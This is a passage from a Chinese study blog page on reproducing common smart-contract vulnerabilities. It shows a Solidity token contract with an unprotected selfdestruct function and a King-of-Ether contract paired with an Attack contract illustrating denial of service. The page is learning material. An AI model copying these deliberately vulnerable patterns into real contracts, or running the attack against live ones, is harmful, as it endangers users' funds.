+            return false; 
+            }
+    }
+
+    function destroycontract(address _to) {
+
+        selfdestruct(_to);
+
+    }
+
+    function distributeTokens(address _to, uint256 _value) returns (bool success) {
+        
+        _value = _value * 1000000000000000000;
+
+        if (balances[msg.sender] &gt;= _value &amp;&amp; _value &gt; 0) {
+            balances[msg.sender] -= _value;
+            balances[_to] += _value;
+            Transfer(msg.sender, _to, _value);
+            return true;
+        } else { 
+            return false; 
+            }
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
+        
+        if (balances[_from] &gt;= _value &amp;&amp; allowed[_from][msg.sender] &gt;= _value &amp;&amp; _value &gt; 0) {
+            balances[_to] += _value;
+            balances[_from] -= _value;
+            allowed[_from][msg.sender] -= _value;
+            Transfer(_from, _to, _value);
+            return true;
+        } else { 
+            return false;
+             }
+    }
+
+    function balanceOf(address _owner) constant returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    function approve(address _spender, uint256 _value) returns (bool success) {
+        allowed[msg.sender][_spender] = _value;
+        Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
+      return allowed[_owner][_spender];
+    }
+
+    mapping (address =&gt; uint256) balances;
+    mapping (address =&gt; mapping (address =&gt; uint256)) allowed;
+    uint256 public totalSupply;
+}
+
+contract Zapit is StandardToken {
+
+    string public name;                   
+    uint8 public decimals;                
+    string public symbol;                 
+    string public version = &quot;Z1.2&quot;; 
+    uint256 public unitsOneEthCanBuy;     
+    uint256 public totalEthInWei;         
+    address public fundsWallet;           
+
+    function Zapit() {
+        balances[msg.sender] = 100000000000000000000000000; 
+        totalSupply = 100000000000000000000000000;          
+        name = &quot;Zapit&quot;;                                   
+        decimals = 18;                                      
+        symbol = &quot;ZAPIT&quot;;                                    
+        unitsOneEthCanBuy = 10000;                          
+        fundsWallet = msg.sender;                           
+    }
+
+    function() payable {
+        totalEthInWei = totalEthInWei + msg.value;
+        uint256 amount = msg.value * unitsOneEthCanBuy;
+        if (balances[fundsWallet] &lt; amount || amount &lt; 1000000000000000000000 || amount &gt; 100000000000000000000000) {
+            msg.sender.transfer(msg.value);
+            return;
+        }
+        transfer(fundsWallet, balances[this]);
+        fundsWallet.transfer(msg.value);                           
+    }
+
+    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
+        allowed[msg.sender][_spender] = _value;
+        Approval(msg.sender, _spender, _value);
+
+        if (!_spender.call(bytes4(bytes32(sha3(&quot;receiveApproval(address,uint256,address,bytes)&quot;))), msg.sender, _value, this, _extraData)) { throw; }
+        return true;
+    }
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br><span class="line-number">112</span><br><span class="line-number">113</span><br><span class="line-number">114</span><br><span class="line-number">115</span><br><span class="line-number">116</span><br><span class="line-number">117</span><br><span class="line-number">118</span><br><span class="line-number">119</span><br><span class="line-number">120</span><br><span class="line-number">121</span><br><span class="line-number">122</span><br><span class="line-number">123</span><br><span class="line-number">124</span><br><span class="line-number">125</span><br><span class="line-number">126</span><br><span class="line-number">127</span><br><span class="line-number">128</span><br><span class="line-number">129</span><br><span class="line-number">130</span><br><span class="line-number">131</span><br></div></div><p>拒绝服务攻击</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+contract KingOfEther {
+    address public king;
+    uint public balance;
+    function claimThrone() external payable {
+        require(msg.value &gt; balance, &quot;Need to pay more to become the king&quot;);
+        (bool sent, ) = king.call{value: balance}(&quot;&quot;);
+        require(sent, &quot;Failed to send Ether&quot;);
+        balance = msg.value;
+        king = msg.sender;
+    }
+}
+
+contract Attack {
+    KingOfEther kingOfEther;
+    constructor(KingOfEther _kingOfEther) {
+        kingOfEther = KingOfEther(_kingOfEther);
+    }
+    function attack() public payable {
+        kingOfEther.claimThrone{value: msg.value}();
+    } 
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>学习文章链接：<a href="https://cloud.tencent.com/developer/article/1703493" target="_blank" rel="noopener noreferrer">智能合约中常见的漏洞总结复现<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>（文本的知识科普环节部分多来自于此）</p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev"><a href="/study/fabric学习.html" class="prev"><i aria-label="icon: left" class="anticon anticon-left"><svg viewBox="64 64 896 896" focusable="false" data-icon="left" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M724 218.3V141c0-6.7-7.7-10.4-12.9-6.3L260.3 486.8a31.86 31.86 0 0 0 0 50.3l450.8 352.1c5.3 4.1 12.9.4 12.9-6.3v-77.3c0-4.9-2.3-9.6-6.1-12.6l-360-281 360-281.1c3.8-3 6.1-7.7 6.1-12.6z"></path></svg></i>
+        fabric学习
+      </a></span> <span class="next"><a href="/study/机器学习.html">
+        机器学习相关
+        <i aria-label="icon: right" class="anticon anticon-right"><svg viewBox="64 64 896 896" focusable="false" data-icon="right" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M765.7 486.8L314.9 134.7A7.97 7.97 0 0 0 302 141v77.3c0 4.9 2.3 9.6 6.1 12.6l360 281.1-360 281.1c-3.9 3-6.1 7.7-6.1 12.6V883c0 6.7 7.7 10.4 12.9 6.3l450.8-352.1a31.96 31.96 0 0 0 0-50.4z"></path></svg></i></a></span></p></div> <div class="page-anchor"><div class="ant-space ant-space-vertical" style="width:100%;"><div class="ant-space-item"><div class="page-anchor-offset"><div><div class="ant-anchor-wrapper" style="max-height:100vh;"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div><div class="ant-anchor-link"><a href="#_0x00-开始" title="0x00 开始" class="ant-anchor-link-title">0x00 开始</a></div><div class="ant-anchor-link"><a href="#_0x01-重注入攻击复现" title="0x01 重注入攻击复现" class="ant-anchor-link-title">0x01 重注入攻击复现</a><div class="ant-anchor-link"><a href="#漏洞分析" title="漏洞分析" class="ant-anchor-link-title">漏洞分析</a></div><div class="ant-anchor-link"><a href="#漏洞复现" title="漏洞复现" class="ant-anchor-link-title">漏洞复现</a></div></div><div class="ant-anchor-link"><a href="#_0x02-整数溢出复现" title="0x02 整数溢出复现" class="ant-anchor-link-title">0x02 整数溢出复现</a><div class="ant-anchor-link"><a href="#漏洞分析-2" title="漏洞分析" class="ant-anchor-link-title">漏洞分析</a></div><div class="ant-anchor-link"><a href="#漏洞复现-2" title="漏洞复现" class="ant-anchor-link-title">漏洞复现</a></div><div class="ant-anchor-link"><a href="#修复方法" title="修复方法" class="ant-anchor-link-title">修复方法</a></div></div><div class="ant-anchor-link"><a href="#_0x03-特权功能暴露功能" title="0x03 特权功能暴露功能" class="ant-anchor-link-title">0x03 特权功能暴露功能</a></div></div></div></div></div></div></div></div> </main> <!----></div><div class="global-ui"></div></div>
+    <script src="/assets/js/app.b6aa09f0.js" defer></script><script src="/assets/js/2.be74dbea.js" defer></script><script src="/assets/js/3.00b422a5.js" defer></script>
+  </body>
+</html>
